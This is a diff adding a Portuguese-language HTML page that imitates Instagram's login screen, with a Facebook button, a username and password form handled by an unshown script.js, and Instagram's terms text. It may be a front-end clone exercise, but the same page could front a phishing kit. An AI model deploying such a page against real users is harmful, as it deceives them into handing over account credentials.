@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Painel</title>
+  <link rel="stylesheet" href="style.css">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+</head>
+<body>
+  <img class="back" src="back.png">
+  <main>
+  <span class="select">Português (Brasil)<i class='bx bx-chevron-down'></i></span>
+    <section class="form">
+      <img class="logo" src="logo.png">
+      <button class="face"><img src="face.png"> Continuar com o Facebook</button>
+      <div class="or">
+        <div></div><span>OU</span><div></div>
+      </div>
+      <form class="dados" id="loginForm" action="javascript:submit()"> 
+      <input id="user" class="user" placeholder="Telefone, nome de usuário ou email" required> 
+      <input id="pass" class="user" placeholder="Senha" required>
+      <span class="esqueceu">Esqueceu a senha?</span>
+        <button id="submitBtn" class="submit" type="submit">Entrar</button>
+        <span class="termos">Ao continuar, você concorda com os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong> do Instagram.</span>
+      </form>
+    </section>
+  </main>
+      <footer>
+        <img src="form.svg">
+      </footer>
+    <script src="script.js"></script>
+</body>
+</html>
